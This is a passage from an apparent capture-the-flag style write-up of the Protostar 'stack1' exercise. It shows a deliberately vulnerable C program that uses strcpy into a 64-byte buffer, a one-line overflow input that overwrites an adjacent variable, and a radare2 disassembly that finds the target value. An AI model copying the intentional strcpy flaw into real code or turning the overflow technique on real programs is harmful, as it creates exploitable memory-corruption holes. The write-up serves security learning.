
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

In the second example the unsafe function strcpy is used to copy the argument, independent of it's length, into the buffer. This will also result in a buffer overflow in case the argument is more than 63 characters.

```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack1 hello                              
Try again, you got 0x00000000
                                                                                                                             
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ ./stack1 $(python -c "print('a'*64+'dcba')")
you have correctly got the variable to the right value
```

We can see in the code that the value of the variable modified needs to be set to 0x61626364. As we're using little endian we'll turn this backwards when overwriting the memory. As 0x61626364 is the same an "abcd" our input becomes 64 characters of random stuff and then "dcba".

---

Imagining that we didn't have the source code. Could we have found the solution easily be disassembling the function main()?

```sh
┌──(kali㉿kali)-[~/vulnhub/protostar-2/bin]
└─$ r2 -d -A stack1   
...
[0xf7fe25b0]> pdf @main
            ; DATA XREF from entry0 @ 0x80483c7(w)
┌ 115: int main (char **argv, char **envp);
│           ; arg char **argv @ ebp+0x8
│           ; arg char **envp @ ebp+0xc
│           ; var int32_t var_4h @ esp+0x4
│           ; var int32_t var_1ch @ esp+0x1c
│           ; var int32_t var_5ch @ esp+0x5c
│           0x08048464      55             push ebp
│           0x08048465      89e5           mov ebp, esp
│           0x08048467      83e4f0         and esp, 0xfffffff0
│           0x0804846a      83ec60         sub esp, 0x60
│           0x0804846d      837d0801       cmp dword [argv], 1
│       ┌─< 0x08048471      7514           jne 0x8048487
│       │   0x08048473      c7442404a0..   mov dword [var_4h], str.please_specify_an_argument_n ; [0x80485a0:4]=0x61656c70 ; "please specify an argument\n"                                                                                               
│       │   0x0804847b      c704240100..   mov dword [esp], 1
│       │   0x08048482      e801ffffff     call sym.imp.errx           ; void errx(int eval)
│       └─> 0x08048487      c744245c00..   mov dword [var_5ch], 0
│           0x0804848f      8b450c         mov eax, dword [envp]
│           0x08048492      83c004         add eax, 4
│           0x08048495      8b00           mov eax, dword [eax]
│           0x08048497      89442404       mov dword [var_4h], eax
│           0x0804849b      8d44241c       lea eax, [var_1ch]
│           0x0804849f      890424         mov dword [esp], eax
│           0x080484a2      e8c1feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x080484a7      8b44245c       mov eax, dword [var_5ch]
│           0x080484ab      3d64636261     cmp eax, 0x61626364         ; 'dcba'
│       ┌─< 0x080484b0      750e           jne 0x80484c0
│       │   0x080484b2      c70424bc85..   mov dword [esp], str.you_have_correctly_got_the_variable_to_the_right_value ; [0x80485bc:4]=0x20756f79 ; "you have correctly got the variable to the right value"                                              
│       │   0x080484b9      e8dafeffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x080484be      eb15           jmp 0x80484d5
│      │└─> 0x080484c0      8b54245c       mov edx, dword [var_5ch]
│      │    0x080484c4      b8f3850408     mov eax, str.Try_again__you_got_0x_08x_n ; str.Try_again__you_got_0x_08x_n
│      │                                                               ; 0x80485f3 ; "Try again, you got 0x%08x\n"           
│      │    0x080484c9      89542404       mov dword [var_4h], edx
│      │    0x080484cd      890424         mov dword [esp], eax
│      │    0x080484d0      e8a3feffff     call sym.imp.printf         ; int printf(const char *format)
│      │    ; CODE XREF from main @ 0x80484be(x)
│      └──> 0x080484d5      c9             leave
└           0x080484d6      c3             ret
[0xf7fe25b0]> 
```

At 0x080484ab we can see a very clear line:
![[Images/Pasted image 20240822144753.png]]

As you can see we even get the reversed string as a comment, very nice!

So it would have been even easier without the source.

